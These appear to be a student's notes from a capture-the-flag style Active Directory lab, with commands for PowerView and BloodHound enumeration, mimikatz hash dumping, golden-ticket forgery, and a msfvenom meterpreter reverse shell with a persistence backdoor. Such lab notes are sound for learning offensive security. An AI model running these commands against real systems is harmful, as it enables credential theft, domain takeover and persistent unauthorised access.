------------------
NOTES
------------------
Machine IP = 10.10.166.11

------------------
Enumeration with powerview
------------------
Script in empire to enumerate the domain

powershell -ep bypass
	bypasses execution policy to easily run scripts

Script cheatsheet
	https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Findind users in the domain
	Get-NetUser
Finding weird shares
	Invoke-ShareFinder
Getting GroupNames with admin in them
	Get-NetGroup -GroupName *admin*
Get the system data
	Get-NetComputer -fulldata | select operatingsystem

POST{P0W3RV13W_FTW}

------------------
Enumeration with Bloodhound
------------------
Get the info from the victim machine
	Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
	gets the import info in a json files (zipped into one zip file) can be fed into bloodhound

Started ssh on my machine, ufw is deny port 22 now

neo4j (uses log4j omg) started
	needs to be ran as root
	neo4j:(my usual pass)

Import button was broken needed to drag and drop the files

Bloodhound is a graphing interface can be used to mess w losers

------------------
Dumping hashes with mimikatz
------------------

lsadump::lsa to dump hashes, just manually added to a txt file and cracked with rockyou

------------------
Golden ticket with mimikatz
------------------
Dump the stuff for krbtgt
	lsadump::lsa /inject /name:krbtgt
Creating the actual golden ticket
	kerberos::golden /user: /domain: /sid: /krbtgt: /id:
	/user = your current user (?)
	/domain = the domain of youre on
	/sid = sid found in hash ex. S-1-5-21-849420856-2351964222-986696166
	/krbtgt = NTLM hash in the dump ex. 5508500012cc005cf7082a9a89ebdfdf
	/id = not sure
elevate to cmd
	misc::cmd

------------------
Enumeration with Server Manager
------------------
had to use a gui and felt like plabs (ew)
in tools of server manager can see some things that would theoretically be helpful

------------------
Maintaining access
------------------
Simple way: set up meterpreter shell and use the persistence module

Creating a payload
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
	LHOST and LPORT being the your info
Handling the call back
	msfconsole exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp

execute the binary on the remote victim to get a call back

Persistence
	background the meterpreter shell
	use exploit/windows/local/persistence
	set the session to the session of the shell

if the machine is shutdown or rebooted, a shell is lost but the persistence gives a backdoor, however can still use the exploit/multi/handler with the payload of windows/meterpreter/reverse_tcp
